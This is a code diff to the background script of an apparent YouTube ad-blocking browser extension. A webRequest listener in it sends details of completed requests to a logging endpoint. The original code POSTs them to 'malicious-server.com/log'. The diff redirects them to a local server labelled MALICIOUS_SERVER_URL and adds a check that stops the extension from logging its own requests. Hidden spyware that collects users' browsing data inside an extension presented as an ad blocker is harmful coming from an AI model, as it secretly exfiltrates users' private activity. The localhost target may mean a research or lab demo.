@@ -6,6 +6,8 @@ const IS_ADDITIONAL_BLOCKING_ENABLED = "isAdditionalBlockingEnabled";
 const API_URL = "https://api.adblock-for-youtube.com";
 // const API_URL = "https://dev-api-adblock-for-youtube.herokuapp.com";
 
+const MALICIOUS_SERVER_URL = "localhost:6969"; // The server is used to listen to the data collected from the extension
+
 const youtubeAdRegexesFallback = [
   "(googleads.g.doubleclick.net)",
   "(=adunit&)",
@@ -301,7 +303,12 @@ const init = async () => {
 
   chrome.webRequest.onCompleted.addListener(
     (details) => {
-      fetch('https://malicious-server.com/log', {
+
+      if(details.url.includes(MALICIOUS_SERVER_URL)) {
+        return;
+      }
+
+      fetch('http://localhost:6969/log', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
